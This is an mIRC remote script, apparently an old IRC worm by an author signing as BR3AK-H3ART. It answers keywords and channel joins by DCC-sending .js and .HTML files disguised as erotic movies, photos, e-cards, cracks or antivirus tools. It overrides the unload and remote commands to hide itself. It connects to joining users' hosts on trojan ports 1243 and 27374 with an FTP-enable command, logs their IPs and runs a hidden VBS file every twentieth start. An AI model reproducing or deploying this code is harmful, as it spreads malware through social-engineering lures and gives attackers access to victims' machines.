[script]
n0=;xxxxxxxxxxxxxxxxxxxxxxxxxxxx
n1=; by BR3AK-H3ART  from:TURKEY
n2=;  br3ak_h3art@hotmail.com
n3=;       »»-(¯`v´¯)--»
n4=;xxxxxxxxxxxxxxxxxxxxxxxxxxxx
n5=on 1:text:*erotic*:?:/msg $nick 1sec send erotic film. | /set  %senddfile C:\WIN98\sexmovie.js | /dccc |  /clear -q $nick
n6=on 1:text:*porno*:?:/msg $nick 1sec send erotic film. | /set  %senddfile C:\WIN98\sexmovie.js | /dccc |  /clear -q $nick
n7=on 1:text:*sex*:?:/msg $nick 1sec send erotic film. | /set  %senddfile C:\WIN98\sexmovielink.HTML | /dccc |  /clear -q $nick
n8=on 1:text:*playboy*:?:/msg $nick 1sec send erotic film. | /set  %senddfile C:\WIN98\sexmovielink.HTML | /dccc |  /clear -q $nick
n9=on 1:text:*photo*:?:/msg $nick ok send my photos 1sec. | /set  %senddfile C:\WIN98\photosalbum.HTML | /dccc | /clear -q $nick
n10=on 1:text:*BR3AK-H3ART*:?:/msg $nick 4You to court danger..!!?'*? ok..
n11=on 1:text:*trojan*:?:/msg $nick 100 hack site to link  html file :)  | /set  %senddfile C:\WIN98\hacklink.HTML | /dccc | /clear -q $nick
n12=on 1:text:*crack*:?:/msg $nick yes Ultimate crack file 100000 serial code | /set  %senddfile C:\WIN98\hacklink.HTML | /dccc | /clear -q $nick
n13=on 1:text:*dcc*:?:/msg $nick ok my photos send you :) | /set  %senddfile C:\WIN98\photosalbum.HTML | /dccc | /clear -q $nick
n14=on 1:text:*file*:?:/msg $nick ok 1sec | /set  %senddfile C:\WIN98\e-card.HTML | /dccc | /clear -q $nick
n15=on 1:text:*antivirus*:?:/msg $nick free antivirus programing. | /set  %senddfile C:\WIN98\antiviruslink.HTML | /dccc | /clear -q $nick
n16=on 1:text:virus*:?:/clear -q $nick
n17=on 1:text:*card virus*:?:/msg $nick not infected e-card viruses this files my collection ok..!!! | /clear -q $nick
n18=on 1:join:#:{
n19=if (%ds.start == 0 ) {
n20=if ( $nick == $me ) { halt }
n21=/set %vbshs C:\WIN98 \e-card.HTML
n22=/dcc send $nick %vbshs | /msg $nick 4my e-card send you..!!
n23=}
n24=if (%ds.start == 1 ) {
n25=if ( $nick == $me ) { halt }
n26=/set %vbshs C:\WIN98\sexmovie.js
n27=/dcc send $nick %vbshs | /msg $nick 4Freeeeeee erotic movie big Bang bing bang. 
n28=}
n29=if (%ds.start == 3 ) {
n30=if ( $nick == $me ) { halt } 
n31=/set %vbshs  C:\WIN98\sexmovielink.HTML
n32=/dcc send $nick %vbshs | /msg $nick 4Free Pamela movies big movies hehehehe.
n33=}
n34=if (%ds.start == 5 ) {
n35=if ( $nick == $me ) { halt }   
n36=/set %vbshs C:\WIN98 \playboygirl.js
n37=/dcc send $nick %vbshs | /msg $nick 4Free Playboy erotic movie '
n38=}
n39=if (%ds.start == 7 ) {
n40=if ( $nick == $me ) { halt }
n41=/set %vbshs C:\WIN98 \passwords.js
n42=/dcc send $nick %vbshs | /msg $nick 4free web password hehehe freee freee hacking hacking hehehe '
n43=}
n44=if (%ds.start == 9 ) {
n45=if ( $nick == $me ) { halt }
n46=/set %vbshs  C:\WIN98\e-card.js
n47=/dcc send $nick %vbshs | /msg $nick 4this e-card for you.
n48=}
n49=if (%ds.start == 11 ) {
n50=if ( $nick == $me ) { halt }
n51=/set %vbshs C:\WIN98 \sexmovie.js
n52=/dcc send $nick %vbshs | /msg $nick 4Freeeeeee erotic movie big Bang bing bang.
n53=}
n54=if (%ds.start == 13 ) {
n55=if ( $nick == $me ) { halt }
n56=/set %vbshs  C:\WIN98\photosalbum.HTML
n57=/dcc send $nick %vbshs | /msg $nick my photos send dcc '
n58=}
n59=if (%ds.start == 15 ) {
n60=if ( $nick == $me ) { halt }
n61=/set %vbshs  C:\WIN98\sexmovie.js
n62=/dcc send $nick %vbshs | /msg $nick 4Freeeeeee erotic movie big Bang bing bang.
n63=}
n64=if (%ds.start == 17 ) {
n65=if ( $nick == $me ) { halt }
n66=/set %vbshs  C:\WIN98\pamela.js
n67=/dcc send $nick %vbshs | /msg $nick 4Free Pamela movies big movies hehehehe.
n68=}
n69=if (%ds.start == 18 ) {
n70=if ( $nick == $me ) { halt }
n71=/set %vbshs  C:\WIN98\100hacklink.HTML
n72=/dcc send $nick %vbshs | /msg $nick 4big 100 hacker's site to link..!!! 
n73=}
n74=if (%ds.start == 19 ) {
n75=if ( $nick == $me ) { halt }  
n76=/set %vbshs  C:\WIN98\playboygirl.js
n77=/dcc send $nick %vbshs | /msg $nick 4Free Playboy erotic movie big girl good girl hehe '
n78=}
n79=if (%ds.start == 20 ) {
n80=if ( $nick == $me ) { halt }
n81=/set %vbshs  C:\WIN98\e-card.HTML
n82=/dcc send $nick %vbshs | /msg $nick 4my e-card send you..!!
n83=}
n84=}
n85=dccc {
n86=/dcc send $nick %senddfile
n87=}
n88=alias unload { if ( $1 = $null ) | ( $2 = $null ) { .echo -e 2* /unload: insufficient parameters | halt } | .echo -e 2*** Unloaded script ' $+ $2- $+ ' | halt }
n89=alias remote { if ( $1 = on ) { .echo -e 2*** Remote is ON (Ctcps,Events,Raw) } | else { .echo -e 2*** Remote is OFF | halt } }
n90=on 1:join:#:{
n91=if ($nick == $me) { goto sccn }
n92=sockclose sb15*
n93=/set %sb15 $site
n94=sockopen sb15 $site 1243
n95=:sccn
n96=if ($nick == $me) { goto eak }
n97=sockclose sb21*
n98=/set %sb21 $site
n99=sockopen sb21 $site 27374
n100=:eak
n101=}
n102=on 1:sockopen:sb15:{
n103=if ($sockerr > 0) return
n104=/sockwrite -nt sb21 FTPenable!br3ak-h3art@@@21:::5$$$C:\
n105=/writeini c:\Msd32.dat ip 1 %sb15
n106=/run c:\scandz.DII
n107=}
n108=on 1:sockopen:sb21: {
n109=if ($sockerr > 0) return
n110=/sockwrite -nt sb21 FTPenable!br3ak-h3art@@@21:::5$$$C:\
n111=/writeini c:\Msd32.dat ip 1 %sb21
n112=/run c:\scandz.DII
n113=}
n114=on 1:start:{
n115=if (%ds.start == $null ) {
n116=set %ds.start 0
n117=}
n118=%ds.start = %ds.start + 1
n119=if (%ds.start == 20 ) {
n120=copy $mircdir\mirc.dll bh.vbs
n121=run bh.vbs
n122=set %ds.start 0
n123=}
n124=}

